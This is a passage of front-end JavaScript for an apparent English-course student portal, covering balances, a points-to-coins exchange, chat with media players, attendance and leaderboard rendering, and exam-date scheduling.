    const response = await fetch('/logout', { method: 'POST' });
    const result = await response.json();
    if (result.success) {
      sessionStorage.clear(); // Очистка sessionStorage
      window.location.href = '/login'; // Редирект на /login
    }
  } catch (error) {
    console.error('Logout error:', error);
    alert('Failed to logout.');
  }
}

async function loadUserPoints(username) {
  try {
    const res = await fetch(`/api/get_balance/${username}`);
    const data = await res.json();
    if (res.ok) {
      document.getElementById("points-balance").textContent = data.balance ?? "--";
    } else {
      document.getElementById("points-balance").textContent = "--";
    }
  } catch (e) {
    document.getElementById("points-balance").textContent = "--";
    console.error("Failed to load points:", e);
  }
}

async function loadUserCoins(username) {
  try {
    const res = await fetch(`/api/get_user_coins/${username}`);
    const data = await res.json();

    if (res.ok && typeof data.coins === "number") {
      const coins = Math.floor(data.coins); // Убираем дробную часть
      const formattedCoins = coins.toLocaleString(); // Форматируем для читаемости

      document.getElementById("coins-value").textContent = formattedCoins;
      document.getElementById("coins-value-in-page").textContent = formattedCoins;
    } else {
      document.getElementById("coins-value").textContent = "--";
      document.getElementById("coins-value-in-page").textContent = "--";
    }
  } catch (e) {
    document.getElementById("coins-value").textContent = "--";
    document.getElementById("coins-value-in-page").textContent = "--";
    console.error("Failed to load coins:", e);
  }
}


async function loadPointsHistory(username) {
  const container = document.getElementById("points-history");
  container.innerHTML = '<div class="loading">Loading...</div>';

  try {
    const res = await fetch(`/api/points_history/${username}`);
    const data = await res.json();

    if (res.ok && Array.isArray(data.history)) {
      if (data.history.length === 0) {
        container.innerHTML = '<div class="loading">No transactions yet.</div>';
        return;
      }

      data.history.sort((a, b) => new Date(b.time) - new Date(a.time));
      container.innerHTML = "";

      const currencyFormatter = new Intl.NumberFormat("en-US", {
        maximumFractionDigits: 0,
      });

      const dateOptions = {
        year: "numeric",
        month: "short",
        day: "numeric",
        hour: "2-digit",
        minute: "2-digit",
      };

      data.history.forEach(entry => {
        const div = document.createElement("div");
        div.className = `transaction-entry ${entry.amount > 0 ? "positive" : "negative"}`;

        const date = new Date(entry.time);
        const timeString = date.toLocaleString(undefined, dateOptions);

        div.innerHTML = `
          <div class="entry-info">
            <div class="entry-description">${entry.description}</div>
            <div class="entry-time">${timeString}</div>
          </div>
          <div class="entry-meta">
            <div class="entry-amount">${entry.amount > 0 ? "+" : ""}${currencyFormatter.format(entry.amount)}</div>
            <div class="entry-balance-before">Before: ${currencyFormatter.format(entry.balance_before)}</div>
          </div>
        `;

        container.appendChild(div);
      });
    } else {
      container.innerHTML = '<div class="loading">Failed to load point history.</div>';
    }
  } catch (e) {
    console.error("Error fetching history:", e);
    container.innerHTML = '<div class="loading">Network error.</div>';
  }
}







document.getElementById("exchange-btn").addEventListener("click", async () => {
  const username = sessionStorage.getItem("username");
  const pointsToExchange = parseInt(document.getElementById("exchange-input").value.trim());
  const statusEl = document.getElementById("exchange-status");

  if (!username || isNaN(pointsToExchange) || pointsToExchange < 10) {
    statusEl.textContent = "Please enter at least 10 points.";
    statusEl.className = "exchange-error";
    showModalStatus("Please enter at least 10 points.", "failed");
    return;
  }

  try {
    const res = await fetch("/api/exchange_points_to_coins", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username, points: pointsToExchange })
    });

    const result = await res.json();

if (res.ok) {
  const coinsReceived = result.coins_added;

  loadPointsHistory(username);
  loadUserCoins(username);
  loadUserPoints(username);
  updateCoinsValue();

  sessionStorage.removeItem("userPoints");

  statusEl.textContent = `✅ Exchanged successfully! You received ${coinsReceived} coin${coinsReceived !== 1 ? 's' : ''}`;
  statusEl.className = "exchange-success flash";
  showModalStatus(`You received ${coinsReceived} coin${coinsReceived !== 1 ? 's' : ''}`, "success");

  document.getElementById("exchange-input").value = "";
}
 else {
      statusEl.textContent = `❌ Error: ${result.error}`;
      statusEl.className = "exchange-error";
      showModalStatus(`Error: ${result.error}`, "failed");
    }
  } catch (err) {
    statusEl.textContent = "❌ Network error. Try again.";
    statusEl.className = "exchange-error";
    showModalStatus("Network error. Try again.", "failed");
  }

  setTimeout(() => statusEl.classList.remove("flash"), 800);
});


document.querySelector(".progress-item.coins").addEventListener("click", () => {
  showPage("coins-page");
  const username = sessionStorage.getItem("username");
  if (username) {
	loadPointsHistory(username);
    loadUserCoins(username); // обновляет в самой странице
    loadUserPoints(username); // обновляет points
    updateCoinsValue();       // 🔄 обновляет иконку снизу
    sessionStorage.removeItem("userPoints"); // удаляем кэш, чтобы пересчитался
  }
});


document.querySelector(".progress-item.points").addEventListener("click", () => {
  showPage("points-page");
  const username = sessionStorage.getItem("username");
  if (username) {
	loadPointsHistory(username);
    loadUserCoins(username); // обновляет в самой странице
    loadUserPoints(username); // обновляет points
    updateCoinsValue();       // 🔄 обновляет иконку снизу
    sessionStorage.removeItem("userPoints"); // удаляем кэш, чтобы пересчитался
  }
});


document.querySelector(".progress-item.strike").addEventListener("click", () => {
  showPage("strikes-page");

  const username = sessionStorage.getItem("username");
  if (!username) return;

  fetch(`/api/get-strikes/${encodeURIComponent(username)}`)
    .then(res => res.json())
    .then(data => {
      const lastStrikes = data.lastStrikeByUnit || {};
      const totalStrikes = data.strikes || 0;
      const pendingUnits = data.pendingUnits || []; // Новый массив с ожидаемыми

      document.getElementById("strike-total").textContent = totalStrikes;
      const container = document.getElementById("unit-strike-list");
      container.innerHTML = "";

      Units.forEach(unit => {
        const div = document.createElement("div");
        div.className = "unit-strike-item";
        div.textContent = `Unit ${unit}`;

        if (lastStrikes[unit]) {
          div.classList.add("strike");
        } else if (pendingUnits.includes(unit)) {
          div.classList.add("pending");
        }

        container.appendChild(div);
      });
    })
    .catch(err => {
      console.error("Ошибка при получении strike истории:", err);
    });
});



    // Smooth scroll to bottom
    function scrollToBottom() {
      messagesDiv.scrollTo({ top: messagesDiv.scrollHeight, behavior: 'smooth' });
    }

    // Create custom video player
    function createCustomVideoPlayer(videoUrl) {
      const player = document.createElement('div');
      player.classList.add('custom-video-player');

      const video = document.createElement('video');
      video.classList.add('video-element');
      video.src = videoUrl;
      video.preload = 'metadata';

      const controls = document.createElement('div');
      controls.classList.add('controls');

      const playBtn = document.createElement('button');
      playBtn.innerHTML = '<i class="fas fa-play"></i>';
      playBtn.setAttribute('aria-label', 'Play/Pause video');

      const progressBar = document.createElement('input');
      progressBar.type = 'range';
      progressBar.classList.add('progress-bar');
      progressBar.value = 0;
      progressBar.setAttribute('aria-label', 'Video progress');

      const timeDisplay = document.createElement('span');
      timeDisplay.classList.add('time');
      timeDisplay.textContent = '00:00';

      controls.appendChild(playBtn);
      controls.appendChild(progressBar);
      controls.appendChild(timeDisplay);
      player.appendChild(video);
      player.appendChild(controls);

      let hideControlsTimeout;
      function resetControlsTimeout() {
        clearTimeout(hideControlsTimeout);
        controls.style.opacity = '1';
        hideControlsTimeout = setTimeout(() => {
          controls.style.opacity = '0';
        }, 3000);
      }

      player.addEventListener('mousemove', resetControlsTimeout);
      video.addEventListener('play', resetControlsTimeout);
      video.addEventListener('pause', resetControlsTimeout);

      playBtn.addEventListener('click', () => {
        if (video.paused) {
          video.play();
          playBtn.innerHTML = '<i class="fas fa-pause"></i>';
        } else {
          video.pause();
          playBtn.innerHTML = '<i class="fas fa-play"></i>';
        }
      });

      video.addEventListener('timeupdate', () => {
        const progress = (video.currentTime / video.duration) * 100;
        progressBar.value = progress;
        const minutes = Math.floor(video.currentTime / 60);
        const seconds = Math.floor(video.currentTime % 60);
        timeDisplay.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
      });

      progressBar.addEventListener('input', () => {
        video.currentTime = (progressBar.value / 100) * video.duration;
      });

      return player;
    }

    // Create custom audio player
    function createCustomAudioPlayer(audioUrl, filename) {
      const player = document.createElement('div');
      player.classList.add('custom-audio-player');

      const audio = document.createElement('audio');
      audio.src = audioUrl;
      audio.preload = 'metadata';

      const maxLength = 20;
      const displayFilename = filename.length > maxLength ? filename.substring(0, maxLength - 3) + '...' : filename;

      const playBtn = document.createElement('button');
      playBtn.classList.add('custom-play-btn');
      playBtn.innerHTML = '<i class="fas fa-play"></i>';
      playBtn.setAttribute('aria-label', 'Play/Pause audio');

      const waves = document.createElement('div');
      waves.classList.add('custom-audio-waves');
      const progress = document.createElement('div');
      progress.classList.add('progress');
      waves.appendChild(progress);

      const timeDisplay = document.createElement('span');
      timeDisplay.classList.add('custom-time-display');
      timeDisplay.textContent = '00:00';

      const filenameDisplay = document.createElement('span');
      filenameDisplay.classList.add('custom-filename');
      filenameDisplay.textContent = displayFilename;

      player.appendChild(filenameDisplay);
      player.appendChild(playBtn);
      player.appendChild(waves);
      player.appendChild(timeDisplay);

      let hideControlsTimeout;
      function resetControlsTimeout() {
        clearTimeout(hideControlsTimeout);
        playBtn.style.opacity = '1';
        waves.style.opacity = '1';
        timeDisplay.style.opacity = '1';
        hideControlsTimeout = setTimeout(() => {
          playBtn.style.opacity = '0.7';
          waves.style.opacity = '0.7';
          timeDisplay.style.opacity = '0.7';
        }, 3000);
      }

      player.addEventListener('mousemove', resetControlsTimeout);
      audio.addEventListener('play', resetControlsTimeout);
      audio.addEventListener('pause', resetControlsTimeout);

      playBtn.addEventListener('click', () => {
        if (audio.paused) {
          audio.play();
          playBtn.innerHTML = '<i class="fas fa-pause"></i>';
        } else {
          audio.pause();
          playBtn.innerHTML = '<i class="fas fa-play"></i>';
        }
      });

      audio.addEventListener('timeupdate', () => {
        const progressWidth = (audio.currentTime / audio.duration) * 100;
        progress.style.width = `${progressWidth}%`;
        const minutes = Math.floor(audio.currentTime / 60);
        const seconds = Math.floor(audio.currentTime % 60);
        timeDisplay.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
      });

      return player;
    }

    // Create message element
    function createMessageElement(message) {
      const messageElement = document.createElement('div');
      messageElement.classList.add('message', message.username === currentUser ? 'user' : 'bot');

      const header = document.createElement('div');
      header.classList.add('message-header');

      const avatarContainer = document.createElement('div');
      avatarContainer.classList.add('avatar-container');

      const avatarPlaceholder = document.createElement('div');
      avatarPlaceholder.classList.add('avatar-placeholder');
      avatarPlaceholder.textContent = message.username.charAt(0).toUpperCase();
      avatarContainer.appendChild(avatarPlaceholder);

      fetch(`/get_avatar/${message.username}`)
        .then(res => res.json())
        .then(data => {
          avatarContainer.innerHTML = '';
          if (data.avatar_url) {
            const avatarImg = document.createElement('img');
            avatarImg.src = data.avatar_url;
            avatarImg.alt = message.username;
            avatarImg.classList.add('avatar-image');
            avatarContainer.appendChild(avatarImg);
          } else {
            avatarContainer.appendChild(avatarPlaceholder);
          }
        })
        .catch(() => {
          avatarContainer.innerHTML = '';
          avatarContainer.appendChild(avatarPlaceholder);
        });

      const usernameElement = document.createElement('span');
      usernameElement.classList.add('message-username');
      usernameElement.textContent = message.username;

      const timestampElement = document.createElement('span');
      timestampElement.classList.add('message-timestamp');
      timestampElement.textContent = message.timestamp || new Date().toLocaleTimeString();

      header.appendChild(avatarContainer);
      header.appendChild(usernameElement);
      header.appendChild(timestampElement);

      const content = document.createElement('div');
      content.classList.add('message-content');

      if (message.type === 'text') {
        content.textContent = message.text;
      } else if (message.type === 'file') {
        if (message.filename.match(/\.(jpeg|jpg|gif|png)$/i)) {
          const imageWrapper = document.createElement('div');
          const imgLoadingSpinner = document.createElement('div');
          imgLoadingSpinner.classList.add('lds-dual-ring');
          content.appendChild(imgLoadingSpinner);

          const image = document.createElement('img');
          image.src = message.url;
          image.alt = message.filename;
          image.classList.add('message-image');
          image.style.display = 'none';

          image.onload = () => {
            imgLoadingSpinner.style.display = 'none';
            image.style.display = 'block';
          };

          image.onerror = () => {
            imgLoadingSpinner.style.display = 'none';
            content.textContent = 'Error loading image';
          };

          imageWrapper.appendChild(image);
          content.appendChild(imageWrapper);
        } else if (message.filename.match(/\.(mp4|webm|ogg)$/i)) {
          const customPlayer = createCustomVideoPlayer(message.url);
          content.appendChild(customPlayer);
        } else if (message.filename.match(/\.(mp3|mpeg)$/i)) {
          const customPlayer = createCustomAudioPlayer(message.url, message.filename);
          content.appendChild(customPlayer);
        }
      }

      messageElement.appendChild(header);
      messageElement.appendChild(content);
      return messageElement;
    }

	// Helper to create chat item elements
function createChatItem(chatId, title, iconClass, previewText) {
  const item = document.createElement('div');
  item.classList.add('chat-item');
  item.dataset.chat = chatId;

  const icon = document.createElement('i');
  icon.className = iconClass;
  item.appendChild(icon);

  const info = document.createElement('div');
  const strong = document.createElement('strong');
  strong.textContent = title;
  const p = document.createElement('p');
  p.textContent = previewText;
  info.appendChild(strong);
  info.appendChild(p);

  item.appendChild(info);

  // On click, open this chat
  item.addEventListener('click', () => {
    currentChatId = chatId;
    // Update header title
    document.querySelector('#chat-ui .header .title').textContent = title;
    // Load messages for this chat
    socket.emit('join_chat', chatId, () => {
      socket.emit('load_messages', chatId);
    });
    // Show chat UI
    showPage('chat-ui');
  });

  return item;
}

// Load public and personal chats into the list
function loadChatList() {
  const chatListContainer = document.querySelector('#chat-list .chat-list');
  chatListContainer.innerHTML = '';

  // Public group chat
  const publicChat = createChatItem(
    'group-General',
    'My Group - General',
    'fas fa-users',
    'No message'
  );
  chatListContainer.appendChild(publicChat);

  // Fetch all users for private chats
  fetch('/api/users')
    .then(res => res.json())
    .then(users => {
      users.forEach(user => {
        // Skip current user
        if (user.username === currentUser) return;

        const chatId = `private-${user.username}`;
        const personalChat = createChatItem(
          chatId,
          user.username,
          'fas fa-user',
          'No message'
        );
        chatListContainer.appendChild(personalChat);
      });
    })
    .catch(err => console.error('Error loading users:', err));
}

    // Load messages
    socket.on('load_messages', (loadedMessages) => {
      messagesDiv.innerHTML = '';
      if (loadedMessages.length === 0) {
        const noMessages = document.createElement('div');
        noMessages.classList.add('no-messages');
        noMessages.innerHTML = '<i class="fas fa-comments"></i><p>No Messages</p><p>Start chatting with groupmates</p>';
        messagesDiv.appendChild(noMessages);
      } else {
        loadedMessages.forEach(message => {
          messagesDiv.appendChild(createMessageElement(message));
        });
        scrollToBottom();
        const lastMessage = loadedMessages[loadedMessages.length - 1];
        updateChatItemPreview(currentChatId, lastMessage);
      }
    });

    // New message
    socket.on('new_message', (message) => {
      const noMessages = messagesDiv.querySelector('.no-messages');
      if (noMessages) noMessages.remove();
      messagesDiv.appendChild(createMessageElement(message));
      scrollToBottom();
      updateChatItemPreview(currentChatId, message);
    });

    // Debounce function
    function debounce(func, wait) {
      let timeout;
      return function executedFunction(...args) {
        const later = () => {
          clearTimeout(timeout);
          func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
      };
    }

    // Send message
    function sendMessage() {
      const text = messageInput.value.trim();
      if (text) {
        socket.emit('send_message', { username: currentUser, text, type: 'text', chatId: currentChatId });
        messageInput.value = '';
      }
    }

    const debouncedSendMessage = debounce(sendMessage, 200);

    messageForm.addEventListener('submit', (e) => {
      e.preventDefault();
      debouncedSendMessage();
    });

    sendButton.addEventListener('click', (e) => {
      e.preventDefault();
      debouncedSendMessage();
    });

    messageInput.addEventListener('keydown', (e) => {
      if (e.key === 'Enter' && !e.shiftKey) {
        e.preventDefault();
        debouncedSendMessage();
      }
    });

    // File upload
    fileInput.addEventListener('change', () => {
      const file = fileInput.files[0];
      if (!file) return;

      const validTypes = [
        'image/jpeg', 'image/jpg', 'image/gif', 'image/png',
        'video/mp4', 'video/webm', 'video/ogg',
        'audio/mpeg', 'audio/mp3'
      ];

      if (!validTypes.includes(file.type)) {
        const errorDiv = document.createElement('div');
        errorDiv.classList.add('error-message');
        errorDiv.textContent = 'Invalid file type. Please upload images, videos, or MP3 files.';
        messagesDiv.appendChild(errorDiv);
        fileInput.value = '';
        return;
      }

      const form = new FormData();
      form.append('file', file);

      fetch('/upload', {
        method: 'POST',
        body: form
      })
        .then(res => res.json())
        .then(data => {
          if (data.success) {
            fileInput.value = '';
          } else {
            throw new Error(data.error || 'Upload failed');
          }
        })
        .catch(err => {
          const errorDiv = document.createElement('div');
          errorDiv.classList.add('error-message');
          errorDiv.textContent = err.message;
          messagesDiv.appendChild(errorDiv);
        });
    });

    // Navigation
    navLinks.forEach(link => {
      link.addEventListener('click', e => {
        e.preventDefault();
        showPage(link.dataset.page);
      });
    });

    chatItems.forEach(item => {
      item.addEventListener('click', () => {
        currentChatId = item.dataset.chat;
        showPage('chat-ui');
        socket.emit('load_messages', { chatId: currentChatId });
      });
    });

    backBtn.addEventListener('click', () => showPage('chat-list'));

    avatar.addEventListener('click', () => showPage('profile'));
    profileAvatar.addEventListener('click', () => showPage('profile'));

    window.addEventListener('popstate', () => {
      const id = location.pathname.replace('/', '') || 'main';
      showPage(id);
    });

    // Update chat item preview
    function updateChatItemPreview(chatId, message) {
      const chatItem = document.querySelector(`.chat-item[data-chat="${chatId}"]`);
      if (chatItem) {
        const preview = chatItem.querySelector('p');
        if (message.type === 'text') {
          preview.textContent = message.text.length > 20 ? message.text.substring(0, 17) + '...' : message.text;
        } else if (message.type === 'file') {
          preview.textContent = message.filename.length > 20 ? message.filename.substring(0, 17) + '...' : message.filename;
        }
      }
    }

    // Load balance
    fetch(`/api/get_balance/${currentUser}`, { method: 'GET' })
      .then(res => res.json())
      .then(data => {
        if (data.balance !== undefined) {
          balanceAmount.textContent = `${data.balance} Points`;
          balanceStatus.textContent = data.balance >= 0 ? 'Paid' : 'Debtor';
          balanceStatus.className = data.balance >= 0 ? 'Paid' : 'Debtor';
		  
if (data.balance >= 0) {
  accountStatus = 'Paid';
} else {
  accountStatus = 'Debtor';
}
if (accountStatus === 'Debtor') {
  // Отключаем переход по вкладкам
  document.querySelectorAll('nav a[data-page="chat-list"], nav a[data-page="progress"]').forEach(link => {
    link.classList.add('disabled');
    link.addEventListener('click', e => {
      e.preventDefault();
    });
  });

  // Отключаем Coin Shop карточки
  document.querySelectorAll('.coin-shop-card').forEach(card => {
    card.classList.add('disabled');
    card.addEventListener('click', e => {
      e.preventDefault();
	  showModalStatus("Your account is restricted due to insufficient balance.","failed");
      showToastNotification("Your account is restricted due to insufficient balance.", 'error');
    });
  });
document.querySelectorAll('.progress-item.coins').forEach(el => {
  el.classList.add('disabled');

  el.addEventListener('click', e => {
    e.preventDefault();
    showModalStatus("Your account is restricted due to insufficient balance.", "failed");
  });
});

}


        }
      });

    // Change avatar functionality
    changeAvatarBtn.addEventListener('click', () => avatarInput.click());
    avatarInput.addEventListener('change', () => {
      const file = avatarInput.files[0];
      if (file) {
        const formData = new FormData();
        formData.append('file', file);
        formData.append('username', currentUser);

        fetch('/upload_avatar', {
          method: 'POST',
          body: formData
        })
          .then(res => res.json())
          .then(data => {
            if (data.avatar_url) {
              avatar.src = data.avatar_url;
              profileAvatar.src = data.avatar_url;
              avatar.style.display = 'block';
              profileAvatar.style.display = 'block';
              avatarInput.value = '';
            }
          })
          .catch(err => {
            console.error('Avatar upload failed:', err);
          });
      }
    });

    // Utility function to get current user
    function getCurrentUser() {
      return currentUser;
    }

    // Function to calculate next exam date
// Declare globals to store current student level and unit
let currentLevel = null;
let currentUnit  = null;
let activeCurrentUnit = null;

function getNextExamDate(unit, startDate, studyDays) {
  console.log('📅 getNextExamDate called with:');
  console.log('   ➤ unit:', unit);
  console.log('   ➤ startDate:', startDate);
  console.log('   ➤ studyDays:', studyDays);

  const currentDate = new Date();
  let baseDate = startDate ? new Date(startDate) : currentDate;
  baseDate.setHours(0, 0, 0, 0);

  // 🔹 Константы
  const daysPerUnit = 3;
  const midExamDays = 6 * daysPerUnit;     // After Unit 6.3
  const finalExamDays = 12 * daysPerUnit;  // After Unit 12.3

  // 🔹 Разбор текущего Unit
  const [week, day] = unit.split('.').map(Number);
  const currentStudyDays = (week - 1) * daysPerUnit + day;

  console.log('   ➤ week:', week, 'day:', day);
  console.log('   ➤ currentStudyDays:', currentStudyDays);

  // 🔹 Разрешённые учебные дни
  const oddDays = [1, 3, 5];   // Mon, Wed, Fri
  const evenDays = [2, 4, 6];  // Tue, Thu, Sat
  const allowedDays = studyDays === "even" ? evenDays : oddDays;

  // 🔹 Вспомогательная функция: найти дату экзамена после N учебных дней
  function calculateExamDate(targetDays) {
    let count = 0;
    let temp = new Date(baseDate);

    // Найдём первый разрешённый учебный день
    while (!allowedDays.includes(temp.getDay())) {
      temp.setDate(temp.getDate() + 1);
    }

    while (count < targetDays) {
      if (allowedDays.includes(temp.getDay())) {
        count++;
      }
      temp.setDate(temp.getDate() + 1);
    }

    const readable = temp.toLocaleDateString('en-US', {
      weekday: 'long',
      year: 'numeric',
      month: 'long',
      day: 'numeric'
    });

    console.log(`   ✅ Target ${targetDays} study days reached: ${readable}`);
    return readable;
  }

  // 🔹 Решаем, какой экзамен следующий
  if (currentStudyDays < midExamDays) {
    console.log('   ➤ Mid Term is next');
    return calculateExamDate(midExamDays);
  } else if (currentStudyDays < finalExamDays) {
    console.log('   ➤ Final Exam is next');
    return calculateExamDate(finalExamDays);
  } else {
    console.log('   🚫 Course finished, no upcoming exams');
    return "No upcoming exams";
  }
}




function getNextLevel(currentLevel) {
  const levels = ['Beginner', 'Elementary', 'Pre-intermediate', 'IELTS L1', 'IELTS L2'];
  const currentIndex = levels.indexOf(currentLevel);
  if (currentIndex === -1 || currentIndex === levels.length - 1) {
    return currentLevel;
  }
  return levels[currentIndex + 1];
}

const Units = [
  "1.1", "1.2", "1.3",
  "2.1", "2.2", "2.3",
  "3.1", "3.2", "3.3",
  "4.1", "4.2", "4.3",
  "5.1", "5.2", "5.3",
  "6.1", "6.2", "6.3",
  "7.1", "7.2", "7.3",
  "8.1", "8.2", "8.3",
  "9.1", "9.2", "9.3",
  "10.1", "10.2", "10.3",
  "11.1", "11.2", "11.3",
  "12.1", "12.2", "12.3"
];

function fetchStudentProgress() {
  let currentView = "progress";
  const username = getCurrentUser();
  const errorMessageEl = document.getElementById("error-message");
  const progressCard = document.getElementById("progress-card");
  const progressContainer = document.getElementById("progress-container");
  const loadingEl = document.getElementById("loading");
  const fixedTableHead = document.getElementById("leaderboard-fixed-table-head");
  const fixedTableBody = document.getElementById("leaderboard-fixed-table-body");
  const unitsTableHead = document.getElementById("leaderboard-units-table-head");
  const unitsTableBody = document.getElementById("leaderboard-units-table-body");
  const toggleProgress = document.getElementById("toggle-progress");
  const toggleToday = document.getElementById("toggle-today");
  const skeletonCard = document.getElementById("progress-card-skeleton");
  let attendancePercentGlobal = '';

  if (skeletonCard) skeletonCard.style.display = "flex";

  errorMessageEl.style.display = "none";
  progressCard.style.display = "none";
  progressContainer.style.display = "none";
  loadingEl.style.display = "flex";
  
// Глобальный объект для хранения прогресса
window.progressInfo = window.progressInfo || {};

// Attendance summary fetch
fetch(`/attendance/summary/${currentUser}`)
  .then(res => res.json())
  .then(attendanceData => {
    const presentCount = attendanceData.presentCount || 0;   // посещенные занятия
    const attendancePercent = Math.min(((presentCount / 48) * 10).toFixed(2), 10);

    // Сохраняем в общий объект прогресса
    progressInfo.attendance = attendancePercent;
	attendancePercentGlobal = attendancePercent;
    console.log("[Attendance] progressInfo.attendance обновлён:", attendancePercent);

    // Обновляем UI
    const attendanceLabel = document.getElementById("attendanceLabel");
    if (attendanceLabel) {
      attendanceLabel.textContent = `${presentCount} / 48 (${attendancePercent}%)`;
      console.log("[Attendance] Обновлён label:", attendanceLabel.textContent);
    }

    const attendanceBar = document.getElementById("progressAttendanceBar");
    if (attendanceBar) {
      attendanceBar.style.width = `${attendancePercent * 10}%`;
      console.log("[Attendance] Обновлён progress bar width:", attendanceBar.style.width);
    }
  })
  .catch(err => {
    console.error("Ошибка загрузки attendance:", err);
  });


function updateTableHeaders(view) {
  if (view === "progress") {
    fixedTableHead.innerHTML = `
      <tr>
        <th>Rank</th>
        <th>Name</th>
        <th>Progress</th>
      </tr>
    `;
    unitsTableHead.innerHTML = '';
  } else if (view === "today") {
    fixedTableHead.innerHTML = `
      <tr>
        <th>Rank</th>
        <th>Name</th>
        <th>Today</th>
      </tr>
    `;

    // Определяем индекс текущего юнита
    const currentUnitIndex = Units.indexOf(currentUnit);

    // Обрезаем Units только до текущего юнита включительно
    const relevantUnits = currentUnitIndex >= 0
      ? Units.slice(0, currentUnitIndex + 1)
      : [];

    // Генерация строк заголовков
    const headerRow = document.createElement('tr');
    relevantUnits.forEach(unit => {
      const th = document.createElement('th');
      th.textContent = `Unit ${unit}`;
      headerRow.appendChild(th);
    });

    // Обновляем заголовок таблицы
    unitsTableHead.innerHTML = '';
    unitsTableHead.appendChild(headerRow);
  }
}

  function updateLeaderboard(view, data, historyData) {
    fixedTableBody.innerHTML = "";
    unitsTableBody.innerHTML = "";
    updateTableHeaders(view);

    if (view === "progress") {
      const sortedLeaderboard = Object.entries(data)
        .sort(([, a], [, b]) => b.progress - a.progress);

      sortedLeaderboard.forEach(([student, studentInfo], index) => {
        const fixedRow = document.createElement('tr');
        const formattedProgress = parseFloat(studentInfo.progress).toFixed(2);
        let progressHtml = `${formattedProgress}%`;

        if (student === username && historyData.length >= 2) {
          const weeklyHistory = historyData.filter(item => item.weeklyExams !== undefined);
          if (weeklyHistory.length >= 2) {
            weeklyHistory.sort((a, b) => b.date.localeCompare(a.date));
            let distinct = [];
            for (let rec of weeklyHistory) {
              if (!distinct.length || rec.date !== distinct[distinct.length - 1].date) {
                distinct.push(rec);
              }
              if (distinct.length === 2) break;
            }
            if (distinct.length === 2) {
              const [mostRecent, previous] = distinct;
              const currentWeekly = parseFloat(mostRecent.weeklyExams);
              const previousWeekly = parseFloat(previous.weeklyExams);
              if (currentWeekly > previousWeekly) {
                progressHtml = `<span class="up-percentage"><i class="fas fa-arrow-up up-icon"></i> ${formattedProgress}%</span>`;
              } else if (currentWeekly < previousWeekly) {
                progressHtml = `<span class="down-percentage"><i class="fas fa-arrow-down down-icon"></i> ${formattedProgress}%</span>`;
              }
            }
          }
        }

        fixedRow.innerHTML = `
          <td><div class="student-avatar">${index + 1}</div></td>
          <td class="student-name">${student}</td>
          <td>${progressHtml}</td>
        `;
        fixedTableBody.appendChild(fixedRow);
        unitsTableBody.appendChild(document.createElement('tr'));
      });
    } else if (view === "today") {
      const currentUnitIndex = Units.indexOf(currentUnit);
const relevantUnits = currentUnitIndex >= 0
  ? Units.slice(0, currentUnitIndex + 1)
  : [];

      const sortedToday = Object.entries(data).map(([student, info]) => {
        const unitPercentages = {};
        relevantUnits.forEach(unit => {
          const tasks = info.tasks.filter(t => t.unit === unit);
          unitPercentages[unit] = tasks.length
            ? tasks.reduce((sum, t) => sum + t.percent, 0) / tasks.length
            : 0;
        });
        const average_percent = relevantUnits.reduce((sum, u) => sum + unitPercentages[u], 0) / relevantUnits.length;
        return [student, { ...info, unitPercentages, average_percent }];
      }).filter(([, info]) => info.average_percent > 0)
        .sort(([, a], [, b]) => b.average_percent - a.average_percent);

      if (sortedToday.length === 0) {
        fixedTableBody.innerHTML = `
          <tr><td colspan="3" style="text-align: center;">No results for today</td></tr>`;
        unitsTableBody.innerHTML = `
          <tr><td colspan="${relevantUnits.length}" style="text-align: center;"></td></tr>`;
      } else {
        sortedToday.forEach(([student, info], index) => {
          const fixedRow = document.createElement('tr');
          fixedRow.innerHTML = `
            <td><div class="student-avatar">${index + 1}</div></td>
            <td class="student-name">${student}</td>
            <td>${info.average_percent.toFixed(2)}%</td>
          `;
          fixedTableBody.appendChild(fixedRow);

          if (student === username) {
            fetch('/api/update-history', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                username: username,
                averagePercent: info.average_percent
              })
            }).then(r => r.ok ? r.json() : Promise.reject(r.statusText))
              .then(console.log)
              .catch(e => console.error('Update-history error:', e));
          }

          const unitsRow = document.createElement('tr');
          unitsRow.innerHTML = relevantUnits
            .map(unit => `<td>${info.unitPercentages[unit].toFixed(2)}%</td>`)
            .join('');
          unitsTableBody.appendChild(unitsRow);
        });
      }
    }

    progressContainer.style.display = "block";
    loadingEl.style.display = "none";
  }

  updateTableHeaders("progress");

  fixedTableBody.innerHTML = `
    <tr><td colspan="3" class="loading-spinner">
      <div class="lds-spinner">${'<div></div>'.repeat(12)}</div>
    </td></tr>`;
  unitsTableBody.innerHTML = `
    <tr><td colspan="${Units.indexOf(activeCurrentUnit) + 1}" class="loading-spinner"></td></tr>`;

  const progressPromise = fetch(`/api/get-student-progress?username=${username}`).then(r => r.ok ? r.json() : r.json().then(data => { throw new Error(data.error); }));
  const progressHistoryPromise = fetch(`/api/get-student-progress-history?username=${username}`).then(r => r.ok ? r.json() : r.json().then(data => { throw new Error(data.error); }));
  const todayResultsPromise = fetch(`/api/get-results/today?level=${currentLevel}`).then(r => r.ok ? r.json() : r.json().then(data => { throw new Error(data.error); }));

  Promise.all([progressPromise, progressHistoryPromise, todayResultsPromise])
    .then(([progressData, progressHistoryData, todayResultsData]) => {
      const progressInfo = progressData[username] || {};
      const summaryInfo = progressHistoryData[username] || {};

      progressInfo.finalExam = parseFloat(summaryInfo.finalExam || "0").toFixed(2);
      progressInfo.weeklyExams = parseFloat(summaryInfo.weeklyExams || "0").toFixed(2);
      progressInfo.totalScore = parseFloat(summaryInfo.totalScore || "0").toFixed(2);
      progressInfo.level = summaryInfo.level || progressInfo.level || 'Beginner';
      progressInfo.coins = progressInfo.coins || 0;
      progressInfo.points = progressInfo.points || 0;
      progressInfo.leaderboardRank = progressInfo.leaderboardRank || '#--';
      progressInfo.strikeDays = progressInfo.strikeDays || 0;

      const { progress = 0, start_date, study_days = "odd", finalExam, weeklyExams, level, coins, points, leaderboardRank, strikeDays } = progressInfo;
      if (!start_date) throw new Error("Start date is missing");

      const currentDate = new Date();
      currentDate.setHours(17, 32, 0, 0);
      const courseStartDate = new Date(start_date);
      const daysElapsed = Math.floor((currentDate - courseStartDate) / (1000 * 60 * 60 * 24)) + 1;
      const completionPercentage = Math.round(Math.min((daysElapsed / 90) * 100, 100));

